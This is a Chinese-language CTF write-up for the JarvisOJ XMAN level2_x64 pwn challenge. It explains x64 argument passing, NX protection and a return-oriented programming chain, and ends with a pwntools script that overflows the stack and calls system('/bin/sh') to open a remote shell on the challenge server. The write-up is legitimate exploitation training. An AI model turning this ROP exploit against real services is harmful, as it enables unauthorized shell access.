---
title: XMAN level2_x64 の Write-Up
date: 2020-05-11 20:36:18
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- XMAN
- Stack
---
## Introduction

&emsp;&emsp;这是JarvisOJ的PWN题部分[XMAN]level2_x64的Write-Up，看上去和[level2](https://coldwave96.github.io/2020/05/01/XMAN-level2/)差不多。实际上由于x64和x86的小小差异，实际操作上稍微有点难度，很适合初学者进一步深入的了解栈。

<!-- more -->

## Step 1

&emsp;&emsp;程序运行图为：

![](/img/XMAN-level2-x64/XMAN1.png)

&emsp;&emsp;然后还是要checksec一下：64位的程序，这次开启了NX保护，这是锁了内存页的执行权限，将禁止栈上的shellcode直接在栈内运行。

![](/img/XMAN-level2-x64/XMAN2.png)

## Step 2

&emsp;&emsp;将程序拖到hopper disassembler中去，发现基本和level2的32位程序一样。那么也许思路还是一样，利用vulnerable_function函数的栈溢出覆盖返回地址，使得程序跳转到system函数，然后覆盖这个函数jmp到的GOT表地址为数据中的“/bin/sh”。

&emsp;&emsp;但是这里由于x64和x86调用函数不同的传参方式，需要换种方式将“/bin/sh”传入到system函数中去。

&emsp;&emsp;简单说一下x64和x86的传参方式：x86是通过栈实现传参，先将参数压入栈中，靠近call指令的是第一个参数；

&emsp;&emsp;而x64前6个参数通过寄存器传参，如果还有更多的参数，再把过多的那几个参数像x86程序那样压入栈中。其中前6个参数依次放在rdi，rsi，rdx，rcx，r8，r9中。

&emsp;&emsp;了解了这些，再和之前level2比较一下两次的vulnerable_function函数有什么不一样：

&emsp;&emsp;x64:

![](/img/XMAN-level2-x64/XMAN3.png)

&emsp;&emsp;x86：

![](/img/XMAN-level2-x64/XMAN4.png)

&emsp;&emsp;可见在x64中system函数的参数是通过edi这个寄存器传入的，所以我们的思路变成覆盖edi的值。加上刚开始chesec时发现NX保护是开启的，那么我们自然而然的想到ROP链。

## Step 3

&emsp;&emsp;关于ROP，全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。其实这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码（也即gadgets）。

&emsp;&emsp;具体的ROP技术我会继续学习，这里就不详细解释，简单来说这里利用程序自己带有pop edi/rdi;ret语句达到给edi赋值的效果。pop edi语句是将当前的栈顶元素传递给edi，在执行pop语句时，只要保证栈顶元素是”/bin/sh”的地址，并将返回地址设置为system即可实现本次的ROP链。

&emsp;&emsp;而pop edi；ret语句的地址可以通过ROPgadget去找：

![](/img/XMAN-level2-x64/XMAN5.png)

&emsp;&emsp;由于本次的程序没有开启内存地址随机化，所以找到的地址是可以直接写在EXP代码中的。

&emsp;&emsp;下面具体的解释一下针对这个程序构建的EXP思路，示意图如下所示：

![](/img/XMAN-level2-x64/XMAN6.png)

&emsp;&emsp;最左边是我们理想中布局好的栈帧分布，上方是高地址，下方是低地址，所以栈是向下“生长”的。

&emsp;&emsp;首先在main函数跳转进入vulnerable_function函数前，将会在内存中压入该函数的返回地址即ret_addr，然后函数保存当前栈帧状态EBP，向系统要了0x80字节的Buf。

&emsp;&emsp;而构造payload时，首先要覆盖函数返回地址为之前我们通过ROPgadget找到的地址，此时的栈顶为“/bin/sh”的地址。`pop edi`会将“/bin/sh”读入到edi中去，然后将ret回到的地址覆盖为system函数的入口就满足了x64程序通过寄存器传参的设定，完美的创造了ROP链。

&emsp;&emsp;具体的EXP代码为：

```Python
from pwn import *

sh = remote('pwn2.jarvisoj.com','9882')
#sh = process('./level2_x64')

elf = ELF('./level2_x64')
 
sys_addr = elf.symbols['system']
rop_addr = 0x4006b3
shell_addr = elf.search('/bin/sh').next()
 
payload = 'a' * (0x80 + 0x8) + p64(rop_addr) + p64(shell_addr) + p64(sys_addr)
 
sh.send(payload)
 
sh.interactive()
sh.close()
```

&emsp;&emsp;运行结果如下图：

![](/img/XMAN-level2-x64/XMAN7.png)
